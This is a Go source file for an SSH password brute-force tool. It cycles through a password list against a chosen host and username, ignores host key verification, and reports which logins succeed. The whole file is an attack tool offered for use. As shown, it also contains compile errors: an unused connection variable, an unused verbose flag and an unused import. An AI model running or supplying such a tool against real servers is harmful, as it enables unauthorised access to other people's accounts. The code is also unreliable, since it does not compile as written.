package main

import (
	"bufio"
	"flag"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"os"
	"strings"

	"github.com/fatih/color"
)

func main() {
	printHeader()

	// Command-line flags
	host := flag.String("host", "", "Target SSH server host")
	port := flag.Int("port", 22, "Target SSH server port")
	username := flag.String("username", "", "Target SSH server username")
	passwordFile := flag.String("password-file", "", "Path to the file containing the password list")
	verbose := flag.Bool("V", false, "Display password attempts")

	flag.Parse()

	// Validate required flags
	if *host == "" || *username == "" || *passwordFile == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Read password file
	passwords, err := readPasswords(*passwordFile)
	if err != nil {
		log.Fatalf("Failed to read password file: %s", err)
	}

	// Set up colored output
	successColor := color.New(color.FgGreen)
	failureColor := color.New(color.FgRed)

	// Iterate over the password list
	for _, password := range passwords {
		// Create SSH configuration
		config := &ssh.ClientConfig{
			User: *username,
			Auth: []ssh.AuthMethod{
				ssh.Password(password),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}

		// Attempt SSH connection
		conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port), config)
		if err == nil {
			successColor.Printf("Successful login! Username: %s, Password: %s\n", *username, password)
			// Perform further actions or break the loop on successful login
			break
		} else {
			failureColor.Printf("Login failed! Password: %s, Error: %s\n", password, err)
		}
	}
}

// Read password file and return a list of passwords
func readPasswords(passwordFile string) ([]string, error) {
	file, err := os.Open(passwordFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var passwords []string
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return passwords, nil
}

// Print the program header
func printHeader() {
	header := `
 _/_/_/  _/        _/  _/      _/  _/_/_/  _/      _/   
_/    _/  _/        _/  _/_/    _/    _/    _/  _/      
_/    _/  _/        _/  _/  _/  _/    _/      _/         
_/    _/  _/        _/  _/    _/_/    _/      _/        
 _/_/_/    _/_/_/  _/  _/      _/  _/_/_/  _/    _/       
                                                         
`

	fmt.Println(header)
}
